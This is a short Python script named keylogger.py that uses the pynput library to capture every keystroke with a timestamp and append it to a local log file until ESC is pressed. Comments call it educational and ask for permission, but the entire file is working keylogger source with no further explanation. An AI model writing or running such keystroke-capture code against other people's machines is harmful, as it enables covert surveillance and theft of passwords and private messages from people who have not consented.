# keylogger.py
# Educational keylogger for local testing only
# Make sure you have permission to run it on the system

from pynput import keyboard
import datetime

# File to save logs
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key}\n")

def on_release(key):
    # Stop keylogger when ESC key is pressed
    if key == keyboard.Key.esc:
        print("[*] Keylogger stopped.")
        return False

print("[*] Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
